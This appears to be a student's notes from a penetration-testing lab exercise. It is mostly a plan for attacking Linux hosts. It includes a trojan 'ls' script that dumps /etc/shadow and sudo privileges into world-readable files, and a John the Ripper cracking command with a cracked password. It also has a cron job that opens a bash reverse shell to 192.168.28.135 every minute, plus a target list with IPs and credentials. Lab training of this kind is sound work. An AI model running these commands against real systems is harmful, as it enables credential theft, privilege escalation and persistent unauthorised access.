## Script for 
### vim /tmp/ls
    #!/bin/bash
    cp -r ~ /tmp
    chmod 777 /tmp/billybob
    sudo cat /etc/shadow > /tmp/shadows
    chmod 777 /tmp/shadows
    sudo -l > /tmp/sudooos
    chmod 777 /tmp/sudooos
__________________________________________________________________________________________________________________
## John the ripper
### papa john
    john --wordlist=/home/student/billybob/10-million-password-list-top-10000.txt crackthese.txt
su zeus

ghjcnbnenrf
__________________________________________________________________________________________________________________
## Crontab -e
### disgusting gnu nano (select the vim option)
    * * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.28.135/33403 0>&1'
__________________________________________________________________________________________________________________
# Scheme of Maneuver:
## >Jump Box
## ->Pivot:192.168.28.105
## --->T1: 192.168.28.27
## --->T2: 192.168.28.12

## Target Section:

### Pivot
### Hostname: Donovian-Terminal
### IP: 192.168.28.105
### OS: Ubuntu 18.04
### Creds: comrade :: StudentReconPassword
### Last Known SSH Port: 2222
### PSP: rkhunter
### Malware: none
### Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.

### T1
### Hostname: unknown
### IP: 192.168.28.27
### OS: Linux ver: Unknown
### Creds: comrade :: StudentPrivPassword
### Last Known Ports: unknown
### PSP: unknown
### Malware: unknown
### Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.

### T2
### Hostname: unknown
### IP: 192.168.28.12
### OS: Linux ver: Unknown
### Creds: comrade :: StudentPrivPassword
### Last Known Ports: unknown
### PSP: unknown
### Malware: unknown
### Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
